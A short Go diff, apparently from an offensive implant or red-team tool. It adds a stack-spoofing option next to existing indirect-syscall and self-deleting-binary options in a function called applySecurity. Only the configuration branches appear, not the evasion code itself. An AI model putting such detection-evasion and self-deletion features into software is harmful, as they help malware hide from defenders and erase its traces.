@@ -224,6 +224,9 @@ func applySecurity() {
 	if indirectSyscalls == "true" {
 		initIndirectSyscalls()
 	}
+	if stackSpoof == "true" {
+		initStackSpoof()
+	}
 	if selfDelete == "true" {
 		selfDeleteBinary()
 	}
